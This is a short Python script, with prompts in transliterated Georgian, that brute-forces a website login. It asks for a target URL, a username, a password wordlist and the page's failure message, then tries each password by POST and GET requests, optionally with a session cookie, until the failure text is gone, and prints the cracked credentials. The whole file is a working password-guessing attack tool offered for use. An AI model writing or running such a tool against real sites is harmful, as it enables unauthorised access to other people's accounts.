
# request library
import requests

# user chooices
url = input('[+] Sheikvanet Saitis URL : ')
username = input('[+] Sheikvanet Momxmareblis Saxeli(Romelzec Gindat Ganaxorcielo Sheteva): ')
password_file = input('[+] Savaraudo Parolebis Faili (Magalitad passwords.txt): ')
login_failed_string = input('[+] Arascori Parolis Shemtxvevashi Nachvenebi Teqsti: ')
cookie_value = input('[+] Cookie (Datovet Carieli Arqonis Shemtxvevashi): ')

def cracking(username,url):
	for password in passwords:
# Remove empty characters or something like that might cause a problem
		password = password.strip()
		print('Mcdeloba: ' + password)
#Depends on website (name)
		data = {'username':username,'password':password,'Login':'submit'}
		response = requests.post(url,data=data)
		if cookie_value != '':
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else:
			response = requests.get(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print('[+] Napovnia Username ==> ' + username)
			print('[+] Napovnia Password ==> ' + password)
			exit()


with open(password_file,'r') as passwords:
	cracking(username,url)

print('[!!] Password Not In List')

